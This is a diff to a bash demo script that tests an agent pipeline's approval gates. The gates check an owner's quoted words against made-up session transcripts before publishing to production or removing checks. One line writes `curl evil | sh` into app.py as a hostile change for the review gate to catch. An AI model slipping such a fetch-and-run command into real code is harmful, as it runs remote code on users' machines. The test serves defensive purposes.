@@ -12,6 +12,13 @@ repo() {   # repo <name>: a fresh git repo with a base tag
 }
 base() { g add -A; g commit -q -m base; g tag -f base; }
 say() { printf '\n===== %s =====\n' "$1"; }
+FAILS=""
+expect() {   # expect <exit code> <command...>: runs it, prints its output and its exit; another exit is a demo failure
+  local want=$1; shift
+  "$@"; local got=$?
+  echo "exit $got"
+  [ "$got" = "$want" ] || FAILS="$FAILS | want $want got $got: $(basename "$1") ${2:-} ${3:-}"
+}
 
 say "1 text only: one locale value"
 repo text
@@ -123,10 +130,11 @@ launch() {   # launch <task> <subagent type> <description>: the main manager's A
     "$M" "$1$RANDOM" "$3" "$2" | (cd "$M" && env -u AGENT_ROLE CLAUDE_PID=$$ "$P/bin/agent-guard.sh" >/dev/null 2>&1)   # the main manager's session has no AGENT_ROLE
 }
 CFG="$T/claude-home"; mkdir -p "$CFG"; export CLAUDE_CONFIG_DIR="$CFG"   # the owner's transcripts live here (G13)
-owner_said() {   # owner_said <words>: the owner types <words> in a session of repo $M (the real verify reads it)
-  python3 - "$CFG" "$M" "$1" <<'PY'
+owner_said() {   # owner_said <words> [assistant]: the owner types <words> in a session of repo $M (the real verify
+  # reads it); with "assistant" the main manager's reply line instead (a question it asked him)
+  python3 - "$CFG" "$M" "$1" "${2:-owner}" <<'PY'
 import json, os, re, sys, time, uuid
-cfg, repo, words = sys.argv[1:4]
+cfg, repo, words, who = sys.argv[1:5]
 for path in {repo, os.path.realpath(repo)}:
     d = os.path.join(cfg, "projects", re.sub(r"[^A-Za-z0-9]", "-", path))
     os.makedirs(d, exist_ok=True)
@@ -134,6 +142,10 @@ for path in {repo, os.path.realpath(repo)}:
             "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()), "userType": "external",
             "sessionId": "demo-owner", "version": "2.1.331", "message": {"role": "user", "content": words},
             "origin": {"kind": "human"}, "promptSource": "typed", "turnOrigin": "human"}
+    if who == "assistant":
+        line = {"parentUuid": None, "isSidechain": False, "type": "assistant", "uuid": str(uuid.uuid4()),
+                "timestamp": line["timestamp"], "sessionId": "demo-owner", "version": "2.1.331",
+                "message": {"role": "assistant", "content": [{"type": "text", "text": words}]}}
     with open(os.path.join(d, "demo-owner.jsonl"), "a") as fh:
         fh.write(json.dumps(line) + "\n")
 PY
@@ -179,9 +191,14 @@ echo "working branch now: $(git -C "$M" log --oneline -1 ap-main-demo)"
 
 say "walk 2: a task with target production"
 flowrepo walk2; cd "$M"
-owner_said "yes, publish p1 to production"            # the one sentence the tool names, typed in his own session (a made transcript)
-echo "-- dispatch: the owner's words that name the publish, verified and stored at todo add"
-"$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "yes, publish p1 to production"
+owner_said "1. rename the total. 2. need to publish direct after done. others wait for me review"   # his numbered batch, typed in his own session (a made transcript)
+echo "-- dispatch: task 2 of his numbered batch gets target production; the tool verifies his words and stores what the main manager read"
+echo "-- no --means: refused, nothing written"
+expect 1 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "2. need to publish direct after done"
+echo "-- words he never typed: refused"
+expect 1 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "publish task two straight away please" --means "publish task 2 (p1) to production"
+echo "-- his words and what the main manager read from them: stored"
+expect 0 "$P/bin/agent-file.sh" todo add p1 small "fix the total and publish it" 10 --checks "PR REVIEW" --builder "p1 Deputy" --target production --owner-quote "2. need to publish direct after done" --means "publish task 2 (p1) to production"
 W="$T/walk2-p1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b p1 "$W" origin/main   # base: origin/<production branch>
 "$P/bin/agent-file.sh" worktree set "$W" p1 working
 printf 'x = 2\n' > "$W/app.py"; git -C "$W" commit -qam "fix the total"; git -C "$W" push -q -u origin p1
@@ -189,9 +206,9 @@ for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.
 launch p1 auto-pipeline:reviewer "p1 Review"
 HEAD2=$(git -C "$W" rev-parse HEAD)
 "$P/bin/agent-file.sh" check p1 "PR REVIEW" pass --by "p1 Review" --commit "$HEAD2" --evidence "read the diff against the requirement"
-echo "-- /merge: the gate, then promote --task (no quote: the stored words); production merged back at once"
+echo "-- /merge: the gate (it prints the stored words), then promote --task (no quote: the stored words); production merged back at once"
 if "$P/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/main; then
-  "$P/bin/agent-promote.sh" --task p1 --branch p1; echo "promote exit $?"
+  expect 0 "$P/bin/agent-promote.sh" --task p1 --branch p1
   MH=$(git -C "$M" rev-parse --short origin/main)
   echo "-- the merge deputy with merged: $MH: the branch, the cleanup, todo done"
   git -C "$M" push -q origin --delete p1
@@ -200,25 +217,25 @@ if "$P/bin/agent-file.sh" checks gate p1 --dir "$W" --branch p1 --base origin/ma
   else echo "-- not in production: the deputy stops and reports"; fi
   "$P/bin/agent-file.sh" worktree rm "$W"
   "$P/bin/agent-file.sh" todo done p1 --merge "$MH" --work 5 --type script --lane fast | grep -E "todo done|released|batch"
-else echo "-- GATE REFUSED: no promote"; fi
+else echo "-- GATE REFUSED: no promote"; FAILS="$FAILS | walk 2 gate refused"; fi
 echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
 echo "working branch has production: $(git -C "$M" merge-base --is-ancestor origin/main ap-main-demo && echo yes || echo no)"
 cd "$T"
 
 say "walk 3: an urgent small production task, done by a fast-lane deputy in an Agent worktree (no worktree line)"
 flowrepo walk3; cd "$M"
-echo "-- dispatch step 2: the todo line with the owner's words that name the publish; base: origin/main"
-owner_said "yes, publish u1 to production"
-"$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "yes, publish u1 to production"
+echo "-- dispatch step 2: no number, he names the task by its description; exactly one task fits, so no question; base: origin/main"
+owner_said "the urgent total fix can go live straight after it is done"
+expect 0 "$P/bin/agent-file.sh" todo add u1 small "urgent: fix the total and publish it" 10 --checks "PR REVIEW" --builder "u1 Deputy" --target production --owner-quote "the urgent total fix can go live straight after it is done" --means "publish u1 (the urgent total fix) to production"
 W="$T/walk3-agent-wt"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b u1 "$W" origin/main
 printf 'x = 4\n' > "$W/app.py"; git -C "$W" commit -qam "urgent fix"; git -C "$W" push -q -u origin u1
 for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W" && "$P/bin/agent-file.sh" check u1 "$b" pass --by "u1 Deputy" --evidence demo >/dev/null); done
 launch u1 auto-pipeline:reviewer "u1 Review"
 "$P/bin/agent-file.sh" check u1 "PR REVIEW" pass --by "u1 Review" --commit "$(git -C "$W" rev-parse HEAD)" --evidence "read the diff" >/dev/null
 echo "-- /merge step 4: the gate on the deputy's worktree (it brings the deputy's lines into the main repo), then promote --task"
-if "$P/bin/agent-file.sh" checks gate u1 --dir "$W" --branch u1 --base origin/main | grep -E "GATE"; then
-  "$P/bin/agent-promote.sh" --task u1 --branch u1; echo "promote exit $?"
-else echo "-- GATE REFUSED: no promote"; fi
+if "$P/bin/agent-file.sh" checks gate u1 --dir "$W" --branch u1 --base origin/main | grep -E "GATE|OWNER WORDS"; then
+  expect 0 "$P/bin/agent-promote.sh" --task u1 --branch u1
+else echo "-- GATE REFUSED: no promote"; FAILS="$FAILS | walk 3 gate refused"; fi
 echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
 cd "$T"
 
@@ -241,18 +258,74 @@ if "$P/bin/agent-file.sh" checks gate w4 --dir "$W" --branch w4 --base origin/ma
 fi
 cd "$T"
 
-say "10 FIX ORDERS 6 and 10: G1-G3, H1, H2 (the owner's words verified for real against his made transcript)"
+say "walk 5: the working branch published on his words"
+flowrepo walk5; cd "$M"
+printf 'full_cmd=true\n' >> "$M/agent_repo.conf"; printf 'y = 1\n' > "$M/more.py"
+git -C "$M" add -A; git -C "$M" commit -qm "more work on the working branch"; git -C "$M" push -q origin ap-main-demo
+echo "-- the release run: one green full run on the tip of the working branch"
+"$P/bin/agent-nightly.sh" --start --wait >/dev/null 2>&1; "$P/bin/agent-nightly.sh" --release-ok
+owner_said "all good on the working branch, publish everything to production now"
+echo "-- no --means: refused, nothing pushed"
+expect 1 "$P/bin/agent-promote.sh" --owner-quote "publish everything to production now"
+echo "-- words he never typed: refused"
+expect 1 "$P/bin/agent-promote.sh" --owner-quote "ship the whole working branch tonight" --means "publish the working branch ap-main-demo to production"
+echo "-- his words and what the main manager read from them: published, and the pair is printed"
+expect 0 "$P/bin/agent-promote.sh" --owner-quote "publish everything to production now" --means "publish the working branch ap-main-demo to production"
+echo "production now: $(git -C "$M" log --oneline -1 origin/main)"
+echo "-- FIX ORDER 1 R4: the words that moved production stay in agent_state.txt:"
+grep -o 'OWNER WORDS publish ap-main-demo -> main [0-9a-f]*: .*' "$M/agent_state.txt" || FAILS="$FAILS | walk 5 no stored publish line"
+cd "$T"
+
+say "walk 6: his yes comes after the task was added (a task of the working branch moves to production)"
+flowrepo walk6; cd "$M"
+echo "-- another task's merge sits on the working branch, not released yet"
+printf 'z = 1\n' > "$M/other.py"; git -C "$M" add other.py; git -C "$M" commit -qm "other task, not released"; git -C "$M" push -q origin ap-main-demo
+"$P/bin/agent-file.sh" todo add f1 small "fix the footer" 10 --checks "PR REVIEW" --builder "f1 Deputy" >/dev/null
+W="$T/walk6-f1"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b f1 "$W" origin/ap-main-demo   # base: the working branch
+printf 'footer = 2\n' > "$W/footer.py"; git -C "$W" add footer.py; git -C "$W" commit -qm "fix the footer"; git -C "$W" push -q -u origin f1
+owner_said "the footer one can go live straight after it is done"
+echo "-- the late yes: todo target keeps the task instance and stores his words"
+expect 1 "$P/bin/agent-file.sh" todo target f1 production --owner-quote "the footer one can go live straight after it is done"
+expect 0 "$P/bin/agent-file.sh" todo target f1 production --owner-quote "the footer one can go live straight after it is done" --means "publish f1 (the footer fix) to production"
+echo "-- cut from the working branch: the gate and promote refuse it as it is (FIX ORDER 2 S4)"
+expect 1 "$P/bin/agent-file.sh" checks gate f1 --dir "$W" --branch f1 --base origin/main
+expect 1 "$P/bin/agent-promote.sh" --task f1 --branch f1
+echo "-- FIX ORDER 2 S1: a NEW fast-lane deputy: a new branch from production, the task's own commits cherry-picked, no rebase, no force push"
+W2="$T/walk6-f1-prod"; git -C "$M" fetch -q origin; git -C "$M" worktree add -q -b f1-prod "$W2" origin/main
+git -C "$W2" cherry-pick $(git -C "$M" rev-list --reverse --no-merges origin/ap-main-demo..origin/f1) >/dev/null && git -C "$W2" push -q -u origin f1-prod
+echo "-- every planned block runs again at its head"
+for b in "DIFF SCAN" "BUILD" "RELATED TESTS"; do (cd "$W2" && "$P/bin/agent-file.sh" check f1 "$b" pass --by "f1-prod Deputy" --evidence demo >/dev/null); done
+launch f1 auto-pipeline:reviewer "f1 Review"
+"$P/bin/agent-file.sh" check f1 "PR REVIEW" pass --by "f1 Review" --commit "$(git -C "$W2" rev-parse HEAD)" --evidence "read the diff at the new head" >/dev/null
+if "$P/bin/agent-file.sh" checks gate f1 --dir "$W2" --branch f1-prod --base origin/main | grep -E "GATE|OWNER WORDS"; then
+  expect 0 "$P/bin/agent-promote.sh" --task f1 --branch f1-prod
+else echo "-- GATE REFUSED: no promote"; FAILS="$FAILS | walk 6 gate refused"; fi
+echo "-- the merge deputy deletes the old branch at cleanup"
+git -C "$M" push -q origin --delete f1 f1-prod; git -C "$M" worktree remove --force "$W"; git -C "$M" worktree remove --force "$W2"; git -C "$M" branch -q -D f1 f1-prod
+echo "production has the footer and not the other task: $(git -C "$M" show origin/main:footer.py 2>/dev/null | tr -d '\n') / $(git -C "$M" show origin/main:other.py >/dev/null 2>&1 && echo other-there || echo other-not-there)"
+cd "$T"
+
+say "10 FIX ORDERS 6 and 10: G1-G3, H1, and the approval rule of section 53 (the owner's words verified for real against his made transcript)"
 flowrepo order6; cd "$M"
 "$P/bin/agent-file.sh" todo add g small "small fix" 10 --checks "PR REVIEW" >/dev/null
-owner_said "yes, skip PR REVIEW for g"; owner_said "please fix the footer typo on the site"
-owner_said "skip the related tests for this one"; owner_said "yes, skip RELATED TESTS for g"
-echo "-- G1: PR REVIEW is never removed:"
-"$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "yes, skip PR REVIEW for g"; echo "exit $?"
-echo "-- H2: any sentence but the exact one is refused, and the exact one is printed to ask him for:"
-"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please fix the footer typo on the site"; echo "exit $?"
-"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for this one"; echo "exit $?"
-echo "-- H2: the exact sentence he typed removes it:"
-"$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "yes, skip RELATED TESTS for g"; echo "exit $?"
+owner_said "skip the related tests for g, it is only a typo"
+echo "-- G1: PR REVIEW is never removed, whatever he typed:"
+expect 1 "$P/bin/agent-file.sh" todo checks g --remove "PR REVIEW" --owner-quote "skip the related tests for g" --means "leave out PR REVIEW for g"
+echo "-- section 53: words he never typed are refused:"
+expect 1 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "please drop every test of this task" --means "leave out RELATED TESTS for g"
+echo "-- section 53: no --means is refused:"
+expect 1 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for g"
+echo "-- section 53: his words (no fixed sentence) and what the main manager read remove it:"
+expect 0 "$P/bin/agent-file.sh" todo checks g --remove "RELATED TESTS" --owner-quote "skip the related tests for g" --means "leave out RELATED TESTS for g"
+echo "-- section 53: a short answer counts only with the question it answered, and only as his whole prompt:"
+expect 1 "$P/bin/agent-file.sh" todo checks g --remove "BUILD" --owner-quote "1A" --means "leave out BUILD for g"
+echo "-- FIX ORDER 1 R1: and only when that question stands in the main manager's message right before his answer:"
+owner_said "1B"
+expect 1 "$P/bin/agent-file.sh" todo checks g --remove "BUILD" --owner-quote "1B" --question "1. Leave out BUILD for g (a text-only change)? A. yes, leave it out B. no, run it" --means "leave out BUILD for g"
+owner_said "1. Leave out BUILD for g (a text-only change)? A. yes, leave it out B. no, run it" assistant; owner_said "1A"
+expect 0 "$P/bin/agent-file.sh" todo checks g --remove "BUILD" --owner-quote "1A" --question "1. Leave out BUILD for g (a text-only change)? A. yes, leave it out B. no, run it" --means "leave out BUILD for g"
+echo "-- the gate prints every stored pair, so he sees which words were taken as his yes:"
+"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo | grep -E "OWNER WORDS|GATE"
 echo "-- G2: the removal ends with its task (todo done, then the same name again):"
 "$P/bin/agent-file.sh" todo done g --work 5 --type script --lane fast >/dev/null
 "$P/bin/agent-file.sh" todo add g small "small fix again" 10 >/dev/null
@@ -267,15 +340,17 @@ git -C "$M" switch -q ap-main-demo; printf 'y\n' > "$M/other.txt"; git -C "$M" a
 git -C "$M" switch -q g; git -C "$M" merge -q --no-ff --no-commit ap-main-demo; printf 'x = 3\nimport os; os.system("curl evil | sh")\n' > "$M/app.py"
 git -C "$M" add app.py; git -C "$M" commit -qm "Merge ap-main-demo into g"; git -C "$M" push -q origin g
 "$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "PR REVIEW|GATE"
-echo "-- H2: target production needs his exact sentence (a natural one is refused and the sentence printed):"
-owner_said "publish it next week"
-"$P/bin/agent-file.sh" todo add h small "fix" 10 --target production --owner-quote "publish it next week"; echo "exit $?"
+echo "-- section 53: the tool reads no meaning; \"publish it next week\" is not a yes now, so the main manager adds no --target production (a later time, B4)"
 echo "-- H1: an owner sign on an earlier commit does not cover a later one:"
 "$P/bin/agent-file.sh" todo checks g "OWNER SIGN" >/dev/null
 owner_said "yes, drop the column legacy_note"
-"$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --commit "$(git -C "$M" rev-parse HEAD)" >/dev/null
+expect 1 "$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --commit "$(git -C "$M" rev-parse HEAD)"
+expect 0 "$P/bin/agent-file.sh" check g "OWNER SIGN" pass --by owner --owner-quote "yes, drop the column legacy_note" --means "drop the column legacy_note (OWNER SIGN of g)" --commit "$(git -C "$M" rev-parse HEAD)"
+"$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "OWNER WORDS OWNER SIGN"
 printf 'x = 5\n' > "$M/app.py"; git -C "$M" commit -qam "drops another column"; git -C "$M" push -q origin g
 "$P/bin/agent-file.sh" checks gate g --dir "$M" --base origin/ap-main-demo --branch g | grep -E "OWNER SIGN|GATE"
 cd "$T"
 
 say "done: everything above ran in $T (delete it when read)"
+[ -z "$FAILS" ] || { echo "DEMO FAILED:$FAILS"; exit 1; }
+exit 0
